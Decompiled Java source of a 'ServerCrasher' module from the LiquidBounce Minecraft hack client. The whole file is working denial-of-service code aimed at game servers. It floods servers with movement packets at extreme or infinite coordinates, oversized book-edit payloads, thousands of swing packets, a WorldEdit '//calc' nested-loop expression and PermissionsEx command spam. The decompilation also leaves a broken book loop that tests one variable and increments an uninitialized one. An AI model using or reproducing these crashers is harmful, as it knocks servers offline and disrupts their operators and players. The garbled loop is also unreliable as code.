/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  io.netty.buffer.Unpooled
 *  kotlin.TypeCastException
 *  kotlin.jvm.internal.DoubleCompanionObject
 *  org.jetbrains.annotations.Nullable
 */
package net.ccbluex.liquidbounce.features.module.modules.exploit;

import io.netty.buffer.Unpooled;
import java.util.Random;
import kotlin.TypeCastException;
import kotlin.jvm.internal.DoubleCompanionObject;
import net.ccbluex.liquidbounce.api.enums.ItemType;
import net.ccbluex.liquidbounce.api.minecraft.client.entity.IEntityPlayerSP;
import net.ccbluex.liquidbounce.api.minecraft.item.IItemStack;
import net.ccbluex.liquidbounce.api.minecraft.nbt.INBTTagCompound;
import net.ccbluex.liquidbounce.api.minecraft.nbt.INBTTagList;
import net.ccbluex.liquidbounce.api.network.IPacketBuffer;
import net.ccbluex.liquidbounce.event.EventState;
import net.ccbluex.liquidbounce.event.EventTarget;
import net.ccbluex.liquidbounce.event.MotionEvent;
import net.ccbluex.liquidbounce.event.TickEvent;
import net.ccbluex.liquidbounce.event.WorldEvent;
import net.ccbluex.liquidbounce.features.module.Module;
import net.ccbluex.liquidbounce.features.module.ModuleCategory;
import net.ccbluex.liquidbounce.features.module.ModuleInfo;
import net.ccbluex.liquidbounce.utils.MinecraftInstance;
import net.ccbluex.liquidbounce.utils.misc.RandomUtils;
import net.ccbluex.liquidbounce.utils.timer.MSTimer;
import net.ccbluex.liquidbounce.value.ListValue;
import org.jetbrains.annotations.Nullable;

@ModuleInfo(name="ServerCrasher", description="Allows you to crash certain server.", category=ModuleCategory.EXPLOIT)
public final class ServerCrasher
extends Module {
    private final ListValue modeValue = new ListValue("Mode", new String[]{"Book", "Swing", "MassiveChunkLoading", "WorldEdit", "Pex", "CubeCraft", "AACNew", "AACOther", "AACOld"}, "Book");
    private final MSTimer pexTimer = new MSTimer();

    @Override
    public void onEnable() {
        IEntityPlayerSP iEntityPlayerSP = MinecraftInstance.mc.getThePlayer();
        if (iEntityPlayerSP == null) {
            return;
        }
        IEntityPlayerSP thePlayer = iEntityPlayerSP;
        String string = (String)this.modeValue.get();
        boolean bl = false;
        String string2 = string;
        if (string2 == null) {
            throw new TypeCastException("null cannot be cast to non-null type java.lang.String");
        }
        switch (string2.toLowerCase()) {
            case "aacnew": {
                int index;
                for (index = 0; index < 9999; ++index) {
                    MinecraftInstance.mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(thePlayer.getPosX() + (double)(9412 * index), thePlayer.getEntityBoundingBox().getMinY() + (double)(9412 * index), thePlayer.getPosZ() + (double)(9412 * index), true));
                }
                break;
            }
            case "aacother": {
                int index;
                for (index = 0; index < 9999; ++index) {
                    MinecraftInstance.mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(thePlayer.getPosX() + (double)(500000 * index), thePlayer.getEntityBoundingBox().getMinY() + (double)(500000 * index), thePlayer.getPosZ() + (double)(500000 * index), true));
                }
                break;
            }
            case "aacold": {
                MinecraftInstance.mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(DoubleCompanionObject.INSTANCE.getNEGATIVE_INFINITY(), DoubleCompanionObject.INSTANCE.getNEGATIVE_INFINITY(), DoubleCompanionObject.INSTANCE.getNEGATIVE_INFINITY(), true));
                break;
            }
            case "worldedit": {
                thePlayer.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
                break;
            }
            case "cubecraft": {
                thePlayer.setPosition(thePlayer.getPosX(), thePlayer.getPosY() + 0.3, thePlayer.getPosZ());
                break;
            }
            case "massivechunkloading": {
                for (double yPos = thePlayer.getPosY(); yPos < (double)255; yPos += 5.0) {
                    MinecraftInstance.mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(thePlayer.getPosX(), yPos, thePlayer.getPosZ(), true));
                }
                for (int i = 0; i < 6685; i += 5) {
                    MinecraftInstance.mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(thePlayer.getPosX() + (double)i, 255.0, thePlayer.getPosZ() + (double)i, true));
                }
                break;
            }
        }
    }

    @EventTarget
    public final void onMotion(MotionEvent event) {
        IEntityPlayerSP thePlayer = MinecraftInstance.mc.getThePlayer();
        if (event.getEventState() == EventState.POST || thePlayer == null) {
            return;
        }
        String string = (String)this.modeValue.get();
        boolean bl = false;
        String string2 = string;
        if (string2 == null) {
            throw new TypeCastException("null cannot be cast to non-null type java.lang.String");
        }
        switch (string2.toLowerCase()) {
            case "book": {
                int i;
                IItemStack bookStack = MinecraftInstance.classProvider.createItemStack(MinecraftInstance.classProvider.getItemEnum(ItemType.WRITABLE_BOOK));
                INBTTagCompound bookCompound = MinecraftInstance.classProvider.createNBTTagCompound();
                bookCompound.setString("author", RandomUtils.INSTANCE.randomNumber(20));
                bookCompound.setString("title", RandomUtils.INSTANCE.randomNumber(20));
                INBTTagList pageList = MinecraftInstance.classProvider.createNBTTagList();
                String pageText = RandomUtils.INSTANCE.randomNumber(600);
                int n = 0;
                int n2 = 49;
                while (n <= n2) {
                    pageList.appendTag(MinecraftInstance.classProvider.createNBTTagString(pageText));
                    ++i;
                }
                bookCompound.setTag("pages", pageList);
                bookStack.setTagCompound(bookCompound);
                n2 = 99;
                for (i = 0; i <= n2; ++i) {
                    IPacketBuffer packetBuffer = MinecraftInstance.classProvider.createPacketBuffer(Unpooled.buffer());
                    packetBuffer.writeItemStackToBuffer(bookStack);
                    MinecraftInstance.mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketCustomPayload(new Random().nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
                }
                break;
            }
            case "cubecraft": {
                double x = thePlayer.getPosX();
                double y = thePlayer.getPosY();
                double z = thePlayer.getPosZ();
                for (int i = 0; i < 3000; ++i) {
                    MinecraftInstance.mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(x, y + 0.09999999999999, z, false));
                    MinecraftInstance.mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketPlayerPosition(x, y, z, true));
                }
                thePlayer.setMotionY(0.0);
                break;
            }
            case "pex": {
                if (!this.pexTimer.hasTimePassed(2000L)) break;
                thePlayer.sendChatMessage(new Random().nextBoolean() ? "/pex promote a a" : "/pex demote a a");
                this.pexTimer.reset();
                break;
            }
            case "swing": {
                for (int i = 0; i < 5000; ++i) {
                    MinecraftInstance.mc.getNetHandler().addToSendQueue(MinecraftInstance.classProvider.createCPacketAnimation());
                }
                break;
            }
            default: {
                this.setState(false);
            }
        }
    }

    @EventTarget
    public final void onWorld(WorldEvent event) {
        if (event.getWorldClient() == null) {
            this.setState(false);
        }
    }

    @EventTarget
    public final void onTick(@Nullable TickEvent event) {
        if (MinecraftInstance.mc.getThePlayer() == null || MinecraftInstance.mc.getTheWorld() == null) {
            this.setState(false);
        }
    }

    @Override
    public String getTag() {
        return (String)this.modeValue.get();
    }
}

